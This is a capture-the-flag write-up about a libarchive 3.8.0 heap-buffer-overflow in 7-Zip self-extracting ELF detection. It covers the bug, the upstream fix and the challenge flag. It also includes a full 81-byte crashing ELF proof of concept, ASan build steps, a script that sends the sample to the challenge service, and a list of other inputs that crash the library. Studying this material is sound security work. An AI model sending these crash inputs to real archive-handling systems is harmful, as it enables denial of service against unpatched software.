---
title: "VULN#007"
category: "Vuln Research"
tags: ["libarchive", "7zip", "sfx", "elf", "heap-buffer-overflow", "crash-oracle"]
solve_date: "2026-11-03T19:05:00+07:00"
language: "en"
points: 100
---

# VULN#007 — libarchive 7-Zip SFX detection heap-buffer-overflow

**Flag:** `CTF{d1644621477661ffdb452d8b4c5394ba}`  
**Service:** `169.58.126.107:7031`  
**Flag format:** `CTF{...}`

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `libarchive-src.tar.gz` (libarchive 3.8.0 + harness) | 6,258,476 | `2c8d20174d60137084fd56e0c633c67f3e9afbb01a46df9e60190f6be0c05e70` |
| `harness/harness.c` | 2,062 | `e0246535b05185aa67066fdb17a064ee2bc7b3abd952600b70140ef35f8cc621` |
| `poc_issue2765.elf` | 81 | `5ef83b82d1fa9e56e127db3d75dc936bd7412e3837d0648245145e1d02f72d1b` |

## Challenge

> VULN#007 — 100 points. An archive-inspection service lists whatever archive file you send it.

The handout is a `libarchive-src.tar.gz` containing an unmodified libarchive **3.8.0** checkout plus a minimal `harness/harness.c`. The remote service accepts a length-prefixed file, runs the harness on it, and reports whether the process crashed. A crash that matches the challenge's target bug returns the flag; any other crash is reported as `a crash happened, but not the target one`.

The service is a crash oracle, so the goal is to find the one memory-safety bug the author selected, not merely any crash in libarchive.

## Analysis

### Handout

`harness.c` is the idiomatic libarchive read path used by `bsdtar`/`bsdunzip` for listing:

```c
struct archive *a = archive_read_new();
archive_read_support_filter_all(a);
archive_read_support_format_all(a);

int r = archive_read_open_memory(a, buf, (size_t)len);
if (r != ARCHIVE_OK) { /* "not valid" */ }

struct archive_entry *entry;
while ((r = archive_read_next_header(a, &entry)) == ARCHIVE_OK) {
    fprintf(stderr, "entry: %s\n", archive_entry_pathname(entry));
    if (++count > 1000) break;
}
```

Only `archive_read_next_header()` is exercised — data decompression is not. The source tree is byte-identical to the upstream **v3.8.0** release (the only additions are `harness/` and a few test fixtures that are not part of the release tarball).

### Service protocol

Each request is a **4-byte big-endian length** followed by exactly that many raw bytes. The observed statuses are:

| Status | Meaning |
|---|---|
| `status: bad length` | declared length is zero or above the service limit |
| `status: not valid` | the input is rejected before the libarchive harness runs |
| `status: no crash` | harness ran and exited normally |
| `status: a crash happened, but not the target one` | a crash was detected, but the signature is not the target |
| `status: crash confirmed (<description>)` + `FLAG: ...` | target crash |
| `status: harness timed out` | harness exceeded the service timeout |
| `status: rate limited, try again later` | per-IP request quota; back off and retry |

### The ELF gate

The first surprise is that ordinary archives are rejected:

```text
zip  -> status: not valid
tar  -> status: not valid
iso  -> status: not valid
7z   -> status: not valid
ELF  -> status: no crash
```

The service only runs the harness when the input is a valid **ELF** executable. This is not an accident: the target is libarchive's **self-extracting archive (SFX)** support, where an ELF (or PE) stub is followed by an embedded archive. libarchive's 7-Zip bidder recognises a leading `\x7fELF`, parses the ELF section headers, and then searches for the `7z\xbc\xaf\x27\x1c` signature after the `.data` section.

The gate can be confirmed with hybrids: a normal ISO starts with 32 KiB of ignored system area, so replacing its first 64 bytes with a valid ELF header yields a file that passes the gate and is still parsed as ISO9660 by libarchive. A Joliet ISO with a Rock Ridge `CL`/`RE` cycle then crashes the harness, which proves the harness is running over the same buffer.

### The bug

In `libarchive/archive_read_support_format_7zip.c`, `find_elf_data_sec()` reads the ELF section table to locate the `.shstrtab` and `.data` sections. For 32-bit ELF the relevant code is:

```c
e_shoff     = dec32(h + 0x20);
e_shentsize = dec16(h + 0x2E);
e_shnum     = dec16(h + 0x30);
e_shstrndx  = dec16(h + 0x32);

if (e_shnum < e_shstrndx || e_shentsize < 0x18)
    break;

if (__archive_read_seek(a, e_shoff, SEEK_SET) < 0)
    break;
h = __archive_read_ahead(a, (size_t)e_shnum * (size_t)e_shentsize, NULL);
if (h == NULL)
    break;

strtab_offset = (*dec32)(h + e_shstrndx * e_shentsize + 0x10);
strtab_size   = (*dec32)(h + e_shstrndx * e_shentsize + 0x14);
```

The validation uses `e_shnum < e_shstrndx`, which allows **`e_shstrndx == e_shnum`**. The section table read-ahead covers exactly `e_shnum * e_shentsize` bytes, but the code then reads the `strtab_offset`/`strtab_size` fields at index `e_shstrndx`, i.e. one full section entry past the end of the table. When the table sits at the end of the input buffer, the read crosses the heap allocation.

The same pattern exists for 64-bit ELF (`+0x18` / `+0x20`), and `find_elf_data_sec()` also lacks bounds checks on `e_shoff`, `strtab_offset` and the `.data` section's `sh_offset`.

### The fix

Upstream hardened the whole SFX parser in PR **#2985** ("7zip: Harden SFX parser", merged 2026-06-23, included in **3.8.8**). The patch:

- requests `e_shnum * e_shentsize + 0x28` bytes (64-bit) / `+ 0x18` bytes (32-bit), so the extra section entry is inside the read-ahead buffer;
- rejects negative `e_shoff` / `strtab_offset` and offsets above `SFX_MAX_SEEK` (8 MiB);
- bounds `strtab_size` to `SFX_MAX_SEEK`;
- replaces the old `skip_sfx()`/`find_elf_data_sec()` pair with `get_data_offset()`/`get_elf_sfx_offset()`.

The regression test added with the fix, `test_read_format_7zip_issue2765.c`, expects `archive_read_open_filename()` to return `ARCHIVE_FATAL` on the sample from **GitHub issue #2765**. On 3.8.0 the same sample crashes instead.

## PoC

The 81-byte sample from issue #2765 is an ELF32 SFX that hits the exact read:

```text
$ xxd poc_issue2765.elf
00000000: 7f45 4c46 0101 0100 6000 0008 4000 0000  .ELF....`...@...
00000010: 0000 0000 3200 0000 3400 2000 0100 0000  ....2...4. .....
00000020: 0000 0000 0000 0000 0000 0000 0047 4900  .............GI.
00000030: 0100 0100 0000 504b 0070 ff7f 0000 0000  ......PK.p......
00000040: 0000 0000 0800 0000 b801 0000 00cd 8000  ................
00000050: 00                                       .
```

| Field | Value | Consequence |
|---|---|---|
| `e_shoff` | `0` | section table starts at offset 0 |
| `e_shentsize` | `0x49` (73) | one entry is 73 bytes |
| `e_shnum` | `1` | read-ahead covers 73 bytes |
| `e_shstrndx` | `1` | equal to `e_shnum`, so the bounds check passes |

`strtab_size` is read at `h + 1*0x49 + 0x14 = h + 93` while the file (and the harness's `malloc`) is only 81 bytes, so the read lands 12 bytes past the allocation.

### Local verification

Build 3.8.0 with ASan and run the harness:

```bash
cmake -S libarchive-src/src -B build \
  -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
  -DENABLE_TEST=OFF
cmake --build build -j"$(nproc)" --target archive_static
gcc -fsanitize=address -g -O1 -Ilibarchive-src/src/libarchive \
  -o harness libarchive-src/src/harness/harness.c \
  build/libarchive/libarchive.a -lz -lbz2 -llzma -llz4 -lcrypto -lpthread
./harness poc_issue2765.elf
```

```text
==124619==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7bd9311e007c
READ of size 1 at 0x7bd9311e007c thread T0
    #0 archive_le32dec           archive_endian.h:119
    #1 find_elf_data_sec         archive_read_support_format_7zip.c:809
    #2 archive_read_format_7zip_bid  archive_read_support_format_7zip.c:557
    #3 choose_format             archive_read.c:703
    #4 archive_read_open1        archive_read.c:516
    #5 archive_read_open_memory2 archive_read_open_memory.c:86
    #6 archive_read_open_memory  archive_read_open_memory.c:58
    #7 main                      harness.c:47
```

The crash happens during **bidding**, before any 7-Zip header is parsed, so no valid 7z structure is needed beyond the ELF stub.

### Remote

```python
import socket, struct

data = open("poc_issue2765.elf", "rb").read()
s = socket.create_connection(("169.58.126.107", 7031), timeout=5)
s.sendall(struct.pack(">I", len(data)) + data)
print(s.recv(4096).decode())
```

```text
status: crash confirmed (heap-buffer-overflow in 7zip SFX detection)
FLAG: CTF{d1644621477661ffdb452d8b4c5394ba}
```

## Dead ends and the crash oracle

The service distinguishes the target crash from every other crash, which makes the challenge a signature-matching exercise rather than a simple "make it crash" task. Crashes that were rejected with `a crash happened, but not the target one`:

| Input | Crash |
|---|---|
| Joliet ISO with a Rock Ridge `CL`/`RE` cycle | stack overflow in `build_pathname_utf16be` (fixed in 3.8.11, PR #3736) |
| Joliet ISO with an overlong UTF-16BE name | heap-buffer-overflow in `build_pathname_utf16be` (fixed in 3.8.8) |
| Hand-built ELF64 with `e_shnum == e_shstrndx` | heap-buffer-overflow in `find_elf_data_sec` at line 804 (`strtab_offset`) |
| `test_read_format_7zip_malformed3.7z` | SEGV in `check_7zip_header_in_sfx` (fixed by PR #2864) |
| Tar with a `SCHILY.acl.ace` pax header | SEGV in `archive_acl_from_text_nl`; the remote reported `harness timed out` |

The target is specifically the **32-bit `strtab_size` read** at line 809 of `find_elf_data_sec()`, which is the crash from issue #2765 and the one the #2985 regression test covers. The earlier line-804 crash is the same class of bug but a different read site, and the oracle rejects it.

The service also rate-limits aggressively: after a burst of probes it returns `status: rate limited, try again later` for several minutes. Sending one request at a time and backing off between attempts is enough.

## Flag

```text
CTF{d1644621477661ffdb452d8b4c5394ba}
```

## References

- libarchive issue #2765 — <https://github.com/libarchive/libarchive/issues/2765>
- libarchive PR #2985 "7zip: Harden SFX parser" — <https://github.com/libarchive/libarchive/pull/2985>
- Upstream commit `740be68fc03640c7c0c2b5a191eb1337c265e0af`
- libarchive 3.8.8 release — <https://github.com/libarchive/libarchive/releases/tag/v3.8.8>
